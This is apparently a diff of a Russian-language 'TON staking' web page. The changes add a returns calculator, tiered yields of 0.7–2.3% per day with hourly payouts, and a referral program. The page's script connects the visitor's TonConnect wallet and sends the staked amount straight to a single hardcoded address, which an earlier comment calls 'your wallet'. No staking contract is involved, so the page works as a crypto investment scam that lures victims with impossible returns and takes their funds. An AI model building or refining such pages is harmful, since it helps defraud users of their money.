@@ -7,47 +7,52 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <style>
-    :root{
+    :root {
       --border: rgba(15,23,42,.10);
       --shadow: 0 18px 60px rgba(2,6,23,.10);
       --blue: rgba(2,132,199,.95);
     }
-    .shadowSoft{ box-shadow: var(--shadow); }
-    .card{ border:1px solid var(--border); background: rgba(255,255,255,.92); border-radius: 20px; }
-    .muted{ color: rgba(15,23,42,.65); }
-    .btn{ border-radius: 999px; padding:.7rem 1.1rem; font-weight:700; cursor: pointer; transition: all 0.2s; }
-    .btnP{ background: linear-gradient(180deg, rgba(14,165,233,1), rgba(2,132,199,1)); color:#fff; }
-    .btnP:hover{ filter: brightness(.95); transform: scale(0.98); }
-    .btnW{ background:#fff; border:1px solid var(--border); }
-    .sidebarItem{ border-radius: 14px; padding:.78rem 1rem; display:flex; align-items:center; gap:.7rem; border:1px solid rgba(15,23,42,.08); background: rgba(248,250,252,.9); cursor:pointer; }
-    .sidebarItem:hover{ background: rgba(241,250,255,.95); }
-    .sidebarItemActive{ background: rgba(14,165,233,.14); border:1px solid rgba(2,132,199,.25); }
-    .ringBg{
-      position:absolute; right:-70px; bottom:-70px;
-      width:280px; height:280px; border-radius:999px;
-      border:1px solid rgba(2,132,199,.18);
-    }
-    .ringBg2{
-      position:absolute; right:-40px; bottom:-40px;
-      width:220px; height:220px; border-radius:999px;
-      border:1px solid rgba(2,132,199,.16);
-    }
-    input[type="range"]{
+    .shadowSoft { box-shadow: var(--shadow); }
+    .card { border:1px solid var(--border); background: rgba(255,255,255,.92); border-radius: 20px; }
+    .muted { color: rgba(15,23,42,.65); }
+    .btn { border-radius: 999px; padding:.7rem 1.1rem; font-weight:700; cursor: pointer; transition: all 0.2s; }
+    .btnP { background: linear-gradient(180deg, rgba(14,165,233,1), rgba(2,132,199,1)); color:#fff; }
+    .btnP:hover { filter: brightness(.95); transform: scale(0.98); }
+    .btnW { background:#fff; border:1px solid var(--border); }
+    .sidebarItem { border-radius: 14px; padding:.78rem 1rem; display:flex; align-items:center; gap:.7rem; border:1px solid rgba(15,23,42,.08); background: rgba(248,250,252,.9); cursor:pointer; }
+    .sidebarItem:hover { background: rgba(241,250,255,.95); }
+    .sidebarItemActive { background: rgba(14,165,233,.14); border:1px solid rgba(2,132,199,.25); }
+    .ringBg { position:absolute; right:-70px; bottom:-70px; width:280px; height:280px; border-radius:999px; border:1px solid rgba(2,132,199,.18); }
+    .ringBg2 { position:absolute; right:-40px; bottom:-40px; width:220px; height:220px; border-radius:999px; border:1px solid rgba(2,132,199,.16); }
+    input[type="range"] {
       -webkit-appearance:none; width:100%; height:6px; border-radius:999px;
       background: linear-gradient(90deg, var(--blue), rgba(56,189,248,.35)); outline:none;
     }
-    input[type="range"]::-webkit-slider-thumb{
-      -webkit-appearance:none; width:18px;height:18px;border-radius:999px; background:white;
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance:none; width:18px; height:18px; border-radius:999px; background:white;
       border:2px solid var(--blue); box-shadow:0 8px 18px rgba(2,6,23,.18); cursor:pointer;
     }
-    .reveal{ opacity:0; transform: translateY(14px); transition: all .55s ease; }
-    .reveal.show{ opacity:1; transform: translateY(0); }
+    .reveal { opacity:0; transform: translateY(14px); transition: all .55s ease; }
+    .reveal.show { opacity:1; transform: translateY(0); }
+
+    /* Калькулятор */
+    .calc-card { background: linear-gradient(135deg, #f0f9ff, #ffffff); border:1px solid rgba(2,132,199,.2); border-radius: 20px; padding: 28px; box-shadow: var(--shadow); }
+    .calc-input-wrap { background: rgba(14,165,233,.08); border:1px solid rgba(14,165,233,.2); border-radius: 14px; padding: 14px 18px; margin-bottom: 16px; }
+    .calc-input-label { font-size: 0.75rem; font-weight: 600; color: rgba(15,23,42,.5); text-transform: uppercase; letter-spacing: .05em; margin-bottom: 6px; }
+    .calc-input-field { width:100%; background:transparent; border:none; outline:none; font-size:1.4rem; font-weight:800; color:#0f172a; }
+    .calc-result-row { display:flex; justify-content:space-between; align-items:center; padding: 12px 0; border-bottom: 1px solid rgba(15,23,42,.06); }
+    .calc-result-row:last-child { border-bottom: none; }
+    .calc-result-label { font-size: 0.88rem; color: rgba(15,23,42,.55); }
+    .calc-result-value { font-size: 1rem; font-weight: 700; color: #0f172a; }
+    .calc-result-value.profit { color: #0ea5e9; font-size: 1.3rem; }
+    .calc-result-value.total { font-size: 1.6rem; font-weight: 800; background: linear-gradient(90deg, #0ea5e9, #38bdf8); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
   </style>
 </head>
 <body class="bg-slate-50">
 
 <div class="min-h-screen flex">
 
+  <!-- SIDEBAR -->
   <aside class="w-[280px] hidden md:flex flex-col gap-4 p-5 bg-white border-r border-slate-200">
     <div class="flex items-center gap-3 px-2 py-2">
       <div class="h-10 w-10 rounded-2xl bg-sky-500"></div>
@@ -62,21 +67,12 @@
     </button>
 
     <nav class="mt-1 space-y-2">
-      <div class="sidebarItem sidebarItemActive" data-tab="staking">
-        <span>🪙</span><span class="font-semibold">Стейкинг</span>
-      </div>
-      <div class="sidebarItem" data-tab="history">
-        <span>📜</span><span>История</span>
-      </div>
-      <div class="sidebarItem" data-tab="support">
-        <span>💬</span><span>Поддержка</span>
-      </div>
-      <div class="sidebarItem" data-tab="ref">
-        <span>👥</span><span>Реф. программа</span>
-      </div>
-      <div class="sidebarItem" data-tab="promo">
-        <span>🎁</span><span>Промокод</span>
-      </div>
+      <div class="sidebarItem sidebarItemActive" data-tab="staking"><span>🪙</span><span class="font-semibold">Стейкинг</span></div>
+      <div class="sidebarItem" data-tab="calculator"><span>🧮</span><span>Калькулятор</span></div>
+      <div class="sidebarItem" data-tab="history"><span>📜</span><span>История</span></div>
+      <div class="sidebarItem" data-tab="support"><span>💬</span><span>Поддержка</span></div>
+      <div class="sidebarItem" data-tab="ref"><span>👥</span><span>Реф. программа</span></div>
+      <div class="sidebarItem" data-tab="promo"><span>🎁</span><span>Промокод</span></div>
     </nav>
 
     <div class="mt-auto text-xs muted px-2">
@@ -85,7 +81,9 @@
     </div>
   </aside>
 
+  <!-- MAIN -->
   <main class="flex-1">
+    <!-- TOP BAR -->
     <div class="h-[72px] bg-white border-b border-slate-200 flex items-center justify-between px-4 md:px-8">
       <div class="flex items-center gap-3">
         <div class="md:hidden">
@@ -95,7 +93,6 @@
           <span id="topTitleIcon">🪙</span> <span id="topTitle">Стейкинг</span>
         </div>
       </div>
-
       <button id="connectBtnTop" class="btn btnP flex items-center gap-2">
         <span>🔗</span> <span id="connectBtnTextTop">Подключить кошелёк</span>
       </button>
@@ -103,6 +100,7 @@
 
     <div class="px-4 md:px-8 py-6">
 
+      <!-- СТЕЙКИНГ -->
       <section id="tab-staking" class="tabBlock space-y-6">
         <div class="grid lg:grid-cols-3 gap-4 reveal">
           <div class="card p-4 shadowSoft flex items-center justify-between">
@@ -110,7 +108,7 @@
             <div class="h-10 w-10 rounded-full bg-sky-600 text-white flex items-center justify-center font-bold">1</div>
           </div>
           <div class="card p-4 shadowSoft flex items-center justify-between">
-            <div class="text-sm muted">Нажмите “В стейкинг” и подтвердите.</div>
+            <div class="text-sm muted">Нажмите "В стейкинг" и подтвердите.</div>
             <div class="h-10 w-10 rounded-full bg-sky-600 text-white flex items-center justify-center font-bold">2</div>
           </div>
           <div class="card p-4 shadowSoft flex items-center justify-between bg-gradient-to-r from-white to-sky-100">
@@ -129,17 +127,28 @@
               </div>
               <div>
                 <div class="text-xs muted">Доходность</div>
-                <div class="text-2xl font-bold">0.3% / день</div>
+                <div class="text-2xl font-bold">0.7% – 2.3% / день</div>
               </div>
             </div>
             <div class="ringBg"></div>
             <div class="ringBg2"></div>
           </div>
-
-          <div class="card p-6 shadowSoft relative overflow-hidden">
-            <div class="font-bold">Ставка</div>
-            <div class="mt-2 text-3xl font-bold text-sky-600">0.3%</div>
-            <div class="text-sm muted mt-1">Фиксированная ставка</div>
+          <div class="card p-6 shadowSoft">
+            <div class="font-bold">Тарифы</div>
+            <div class="mt-3 space-y-2 text-sm">
+              <div class="flex justify-between items-center p-2 rounded-xl bg-sky-50">
+                <span class="muted">10 – 2 499 TON</span>
+                <span class="font-bold text-sky-600">0.7% / день</span>
+              </div>
+              <div class="flex justify-between items-center p-2 rounded-xl bg-sky-100">
+                <span class="muted">2 500 – 6 999 TON</span>
+                <span class="font-bold text-sky-600">1.1% / день</span>
+              </div>
+              <div class="flex justify-between items-center p-2 rounded-xl bg-sky-50">
+                <span class="muted">7 000 – 10 000 TON</span>
+                <span class="font-bold text-sky-600">2.3% / день</span>
+              </div>
+            </div>
           </div>
         </div>
 
@@ -150,28 +159,30 @@
               <div class="rounded-2xl bg-sky-50 border border-sky-100 p-4">
                 <div class="flex items-center justify-between text-sm">
                   <div class="font-semibold text-sky-700"><span id="amountOut">10</span> TON</div>
-                  <div class="muted">Выберите сумму</div>
+                  <div class="muted">Выберите сумму (10 – 10 000 TON)</div>
                 </div>
-                <input id="amountRange" type="range" min="1" max="5000" step="1" value="10" class="mt-3" />
+                <input id="amountRange" type="range" min="10" max="10000" step="10" value="10" class="mt-3" />
               </div>
 
               <div class="mt-4 rounded-2xl border border-sky-200 bg-white p-4">
-                <div class="grid grid-cols-2 gap-3 text-sm text-center">
+                <div class="grid grid-cols-3 gap-3 text-sm text-center">
+                  <div class="rounded-xl border border-slate-100 bg-slate-50 p-3">
+                    <div class="muted text-xs">Тариф</div>
+                    <div id="stakeTariff" class="font-bold text-sky-600">Basic ⚡</div>
+                  </div>
                   <div class="rounded-xl border border-slate-100 bg-slate-50 p-3">
                     <div class="muted text-xs">Доход в день</div>
-                    <div id="dayProfitOut" class="font-bold text-emerald-600">+ 0.03 TON</div>
+                    <div id="dayProfitOut" class="font-bold text-emerald-600">+ 0.07 TON</div>
                   </div>
                   <div class="rounded-xl border border-slate-100 bg-slate-50 p-3">
                     <div class="muted text-xs">Доход в месяц</div>
-                    <div id="monthProfitOut" class="font-bold text-emerald-600">+ 0.90 TON</div>
+                    <div id="monthProfitOut" class="font-bold text-emerald-600">+ 2.10 TON</div>
                   </div>
                 </div>
               </div>
 
               <div class="mt-5">
-                <button id="stakeBtn" class="btn btnP w-full py-4 text-lg shadow-lg">
-                  В стейкинг →
-                </button>
+                <button id="stakeBtn" class="btn btnP w-full py-4 text-lg shadow-lg">В стейкинг →</button>
                 <div id="txStatus" class="mt-3 text-center text-sm font-medium"></div>
               </div>
             </div>
@@ -180,38 +191,78 @@
           <div class="card p-6 shadowSoft">
             <div class="font-bold">Информация</div>
             <div class="mt-4 text-sm space-y-3">
-              <div class="flex justify-between">
-                <span class="muted">Минимум:</span>
-                <span class="font-bold">1 TON</span>
-              </div>
-              <div class="flex justify-between">
-                <span class="muted">Максимум:</span>
-                <span class="font-bold">5000 TON</span>
-              </div>
-              <div class="flex justify-between">
-                <span class="muted">Сеть:</span>
-                <span class="font-bold text-sky-600">TON Mainnet</span>
-              </div>
+              <div class="flex justify-between"><span class="muted">Минимум:</span><span class="font-bold">10 TON</span></div>
+              <div class="flex justify-between"><span class="muted">Максимум:</span><span class="font-bold">10 000 TON</span></div>
+              <div class="flex justify-between"><span class="muted">Сеть:</span><span class="font-bold text-sky-600">TON Mainnet</span></div>
+              <div class="flex justify-between"><span class="muted">Выплаты:</span><span class="font-bold">каждый час</span></div>
             </div>
           </div>
         </div>
       </section>
 
+      <!-- КАЛЬКУЛЯТОР -->
+      <section id="tab-calculator" class="tabBlock hidden">
+        <div class="max-w-2xl mx-auto">
+          <div class="text-2xl font-bold mb-6">🧮 Калькулятор доходности</div>
+          <div class="calc-card reveal">
+            <!-- Сумма -->
+            <div class="calc-input-wrap">
+              <div class="calc-input-label">Сумма (TON)</div>
+              <input type="number" class="calc-input-field" id="calc-amount" value="1000" min="10" max="10000" placeholder="Введите сумму">
+              <input type="range" id="calc-amount-range" min="10" max="10000" step="10" value="1000" class="mt-3">
+            </div>
+            <!-- Дни -->
+            <div class="calc-input-wrap">
+              <div class="calc-input-label">Количество дней (макс. 30)</div>
+              <input type="number" class="calc-input-field" id="calc-days" value="30" min="1" max="30" placeholder="Кол-во дней">
+              <input type="range" id="calc-days-range" min="1" max="30" step="1" value="30" class="mt-3">
+            </div>
+            <!-- Результаты -->
+            <div class="mt-6 bg-white rounded-2xl border border-slate-100 p-5">
+              <div class="calc-result-row">
+                <span class="calc-result-label">Тариф</span>
+                <span class="calc-result-value" id="calc-tariff">Basic ⚡</span>
+              </div>
+              <div class="calc-result-row">
+                <span class="calc-result-label">Ставка в сутки</span>
+                <span class="calc-result-value" id="calc-rate">0.7%</span>
+              </div>
+              <div class="calc-result-row">
+                <span class="calc-result-label">Твоя прибыль</span>
+                <span class="calc-result-value profit" id="calc-profit">+0.00 TON</span>
+              </div>
+              <div class="calc-result-row">
+                <span class="calc-result-label">Итого</span>
+                <span class="calc-result-value total" id="calc-total">0.00 TON</span>
+              </div>
+            </div>
+            <!-- CTA -->
+            <button class="mt-5 btn btnP w-full py-4 text-base" onclick="showTab('staking')">
+              Начать инвестировать →
+            </button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ИСТОРИЯ -->
       <section id="tab-history" class="tabBlock hidden card p-6 shadowSoft">
         <h2 class="text-xl font-bold">История</h2>
         <p class="muted mt-2">Тут будет список ваших транзакций.</p>
       </section>
 
+      <!-- ПОДДЕРЖКА -->
       <section id="tab-support" class="tabBlock hidden card p-6 shadowSoft">
         <h2 class="text-xl font-bold">Поддержка</h2>
-        <p class="muted mt-2">Пишите нам в Telegram: <a href="#" class="text-sky-600 font-bold">@TonStakeSupport</a></p>
+        <p class="muted mt-2">Пишите нам в Telegram: <a href="https://t.me/TonStakeSupportBot" target="_blank" class="text-sky-600 font-bold">@TonStakeSupportBot</a></p>
       </section>
 
+      <!-- РЕФ -->
       <section id="tab-ref" class="tabBlock hidden card p-6 shadowSoft">
         <h2 class="text-xl font-bold">Реферальная программа</h2>
         <p class="muted mt-2">Приглашайте друзей и получайте 10% от их дохода.</p>
       </section>
 
+      <!-- ПРОМОКОД -->
       <section id="tab-promo" class="tabBlock hidden card p-6 shadowSoft">
         <h2 class="text-xl font-bold">Промокод</h2>
         <input type="text" placeholder="Введите код" class="mt-4 w-full p-3 border rounded-xl" />
@@ -223,94 +274,131 @@
 </div>
 
 <script>
-  // 1. НАСТРОЙКИ
-  const RECEIVER_ADDRESS = "UQAq0NKzs0XtMyzbOn6ieHvAMudRq5ILy8oT_TOMLD8JEutW"; // Твой кошелек
-  const MANIFEST_URL = "https://kap352837598.github.io/tonstaking/tonconnect-manifest.json";
+  // ── НАСТРОЙКИ ──
+  const RECEIVER_ADDRESS = "UQAq0NKzs0XtMyzbOn6ieHvAMudRq5ILy8oT_TOMLD8JEutW";
+  const MANIFEST_URL     = "https://kap352837598.github.io/tonstaking/tonconnect-manifest.json";
 
-  // 2. ИНИЦИАЛИЗАЦИЯ TON CONNECT
-  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-    manifestUrl: MANIFEST_URL
-  });
+  // ── TONCONNECT ──
+  const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({ manifestUrl: MANIFEST_URL });
 
-  // 3. ЭЛЕМЕНТЫ
   const btnSide = document.getElementById("connectBtnSide");
-  const btnTop = document.getElementById("connectBtnTop");
+  const btnTop  = document.getElementById("connectBtnTop");
   const txtSide = document.getElementById("connectBtnTextSide");
-  const txtTop = document.getElementById("connectBtnTextTop");
+  const txtTop  = document.getElementById("connectBtnTextTop");
   const addrSide = document.getElementById("addrSide");
   const stakeBtn = document.getElementById("stakeBtn");
-  const amountRange = document.getElementById("amountRange");
-  const amountOut = document.getElementById("amountOut");
-  const dayProfitOut = document.getElementById("dayProfitOut");
-  const monthProfitOut = document.getElementById("monthProfitOut");
   const txStatus = document.getElementById("txStatus");
 
-  // 4. ЛОГИКА ОБНОВЛЕНИЯ ИНТЕРФЕЙСА
   tonConnectUI.onStatusChange(wallet => {
     if (wallet) {
-      const rawAddr = wallet.account.address;
-      const shortAddr = rawAddr.slice(0, 4) + "..." + rawAddr.slice(-4);
-      txtSide.textContent = "Подключено";
-      txtTop.textContent = shortAddr;
-      addrSide.textContent = "Wallet: " + shortAddr;
+      const short = wallet.account.address.slice(0,4) + "..." + wallet.account.address.slice(-4);
+      txtSide.textContent  = "Подключено";
+      txtTop.textContent   = short;
+      addrSide.textContent = "Wallet: " + short;
       stakeBtn.textContent = "В стейкинг →";
     } else {
-      txtSide.textContent = "Подключить кошелёк";
-      txtTop.textContent = "Подключить кошелёк";
+      txtSide.textContent  = "Подключить кошелёк";
+      txtTop.textContent   = "Подключить кошелёк";
       addrSide.textContent = "Wallet: —";
-      stakeBtn.textContent = "Подключите кошелек";
+      stakeBtn.textContent = "Подключите кошелёк";
     }
   });
 
-  // 5. КЛИК ПО КНОПКАМ ПОДКЛЮЧЕНИЯ
-  const toggleConnect = () => tonConnectUI.connected ? tonConnectUI.disconnect() : tonConnectUI.openModal();
+  const toggleConnect = () =>
+    tonConnectUI.connected ? tonConnectUI.disconnect() : tonConnectUI.openModal();
+
   btnSide.onclick = toggleConnect;
-  btnTop.onclick = toggleConnect;
+  btnTop.onclick  = toggleConnect;
 
-  // 6. ОБНОВЛЕНИЕ СУММ ПРИ ДВИЖЕНИИ ПОЛЗУНКА
-  amountRange.oninput = () => {
+  // ── ТАРИФ ──
+  function getTariff(amount) {
+    if (amount < 2500) return { name: 'Basic ⚡', rate: 0.007 };
+    if (amount < 7000) return { name: 'Pro 🔥',   rate: 0.011 };
+    return                     { name: 'Premium 💎', rate: 0.023 };
+  }
+
+  // ── СТЕЙКИНГ — слайдер суммы ──
+  const amountRange   = document.getElementById("amountRange");
+  const amountOut     = document.getElementById("amountOut");
+  const dayProfitOut  = document.getElementById("dayProfitOut");
+  const monthProfitOut = document.getElementById("monthProfitOut");
+  const stakeTariff   = document.getElementById("stakeTariff");
+
+  function updateStakeUI() {
     const val = parseFloat(amountRange.value);
-    amountOut.textContent = val;
-    dayProfitOut.textContent = "+ " + (val * 0.003).toFixed(2) + " TON";
-    monthProfitOut.textContent = "+ " + (val * 0.09).toFixed(2) + " TON";
-  };
+    const t   = getTariff(val);
+    amountOut.textContent      = val.toLocaleString();
+    stakeTariff.textContent    = t.name;
+    dayProfitOut.textContent   = "+ " + (val * t.rate).toFixed(2) + " TON";
+    monthProfitOut.textContent = "+ " + (val * t.rate * 30).toFixed(2) + " TON";
+  }
+  amountRange.oninput = updateStakeUI;
+  updateStakeUI();
 
-  // 7. ОТПРАВКА ТРАНЗАКЦИИ
+  // ── ОТПРАВКА ТРАНЗАКЦИИ ──
   stakeBtn.onclick = async () => {
     if (!tonConnectUI.connected) {
       tonConnectUI.openModal();
       return;
     }
+    const amount     = parseFloat(amountRange.value);
+    const nanoAmount = (BigInt(Math.round(amount * 1_000_000_000))).toString();
 
-    const amountInTon = amountRange.value;
-    const nanoAmount = (BigInt(Math.floor(amountInTon * 1000000000))).toString();
-
-    txStatus.textContent = "⏳ Ожидание подтверждения в кошельке...";
-    txStatus.className = "mt-3 text-center text-sm font-medium text-blue-600";
-
-    const transaction = {
-      validUntil: Math.floor(Date.now() / 1000) + 300, // 5 минут
-      messages: [
-        {
-          address: RECEIVER_ADDRESS,
-          amount: nanoAmount,
-        }
-      ]
-    };
+    txStatus.textContent  = "⏳ Ожидание подтверждения в кошельке...";
+    txStatus.className    = "mt-3 text-center text-sm font-medium text-blue-600";
 
     try {
-      await tonConnectUI.sendTransaction(transaction);
+      await tonConnectUI.sendTransaction({
+        validUntil: Math.floor(Date.now() / 1000) + 300,
+        messages: [{ address: RECEIVER_ADDRESS, amount: nanoAmount }]
+      });
       txStatus.textContent = "✅ Успешно! Средства отправлены в стейкинг.";
-      txStatus.className = "mt-3 text-center text-sm font-medium text-green-600";
+      txStatus.className   = "mt-3 text-center text-sm font-medium text-green-600";
     } catch (e) {
-      console.error(e);
       txStatus.textContent = "❌ Ошибка или транзакция отменена.";
-      txStatus.className = "mt-3 text-center text-sm font-medium text-red-600";
+      txStatus.className   = "mt-3 text-center text-sm font-medium text-red-600";
     }
   };
 
-  // 8. ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК
-  function showTab(key){
+  // ── КАЛЬКУЛЯТОР (вкладка) ──
+  function updateCalc() {
+    const amount = parseFloat(document.getElementById('calc-amount').value) || 0;
+    const days   = parseFloat(document.getElementById('calc-days').value)   || 0;
+    const t      = getTariff(amount);
+    const profit = amount * t.rate * days;
+    document.getElementById('calc-tariff').textContent = t.name;
+    document.getElementById('calc-rate').textContent   = (t.rate * 100).toFixed(1) + '%';
+    document.getElementById('calc-profit').textContent = '+' + profit.toFixed(2) + ' TON';
+    document.getElementById('calc-total').textContent  = (amount + profit).toFixed(2) + ' TON';
+  }
+
+  // Синхронизация полей и слайдеров калькулятора
+  const calcAmount      = document.getElementById('calc-amount');
+  const calcAmountRange = document.getElementById('calc-amount-range');
+  const calcDays        = document.getElementById('calc-days');
+  const calcDaysRange   = document.getElementById('calc-days-range');
+
+  calcAmount.addEventListener('input', () => { calcAmountRange.value = calcAmount.value; updateCalc(); });
+  calcAmountRange.addEventListener('input', () => { calcAmount.value = calcAmountRange.value; updateCalc(); });
+  calcDays.addEventListener('input', () => {
+    if (calcDays.value > 30) calcDays.value = 30;
+    calcDaysRange.value = calcDays.value;
+    updateCalc();
+  });
+  calcDaysRange.addEventListener('input', () => { calcDays.value = calcDaysRange.value; updateCalc(); });
+  updateCalc();
+
+  // ── ПЕРЕКЛЮЧЕНИЕ ВКЛАДОК ──
+  const tabTitles = {
+    staking:    { icon: '🪙', title: 'Стейкинг' },
+    calculator: { icon: '🧮', title: 'Калькулятор' },
+    history:    { icon: '📜', title: 'История' },
+    support:    { icon: '💬', title: 'Поддержка' },
+    ref:        { icon: '👥', title: 'Реф. программа' },
+    promo:      { icon: '🎁', title: 'Промокод' }
+  };
+
+  function showTab(key) {
     document.querySelectorAll('.tabBlock').forEach(s => s.classList.add('hidden'));
     const t = document.getElementById('tab-' + key);
     if (t) t.classList.remove('hidden');
@@ -319,18 +407,25 @@
     const b = document.querySelector(`.sidebarItem[data-tab="${key}"]`);
     if (b) b.classList.add('sidebarItemActive');
 
-    const titles = { staking: "Стейкинг", history: "История", support: "Поддержка", ref: "Реф. программа", promo: "Промокод" };
-    document.getElementById('topTitle').textContent = titles[key] || "Меню";
+    const info = tabTitles[key] || { icon: '', title: key };
+    document.getElementById('topTitleIcon').textContent = info.icon;
+    document.getElementById('topTitle').textContent     = info.title;
+
+    // reveal animation для новой вкладки
+    t.querySelectorAll('.reveal').forEach(el => {
+      el.classList.remove('show');
+      setTimeout(() => el.classList.add('show'), 50);
+    });
   }
 
   document.querySelectorAll('.sidebarItem').forEach(item => {
     item.onclick = () => showTab(item.dataset.tab);
   });
 
-  // Анимация появления
-  const io = new IntersectionObserver((entries)=>{
-    entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('show'); });
-  }, {threshold: 0.1});
+  // ── АНИМАЦИЯ ПОЯВЛЕНИЯ ──
+  const io = new IntersectionObserver((entries) => {
+    entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('show'); });
+  }, { threshold: 0.1 });
   document.querySelectorAll('.reveal').forEach(el => io.observe(el));
 </script>
 
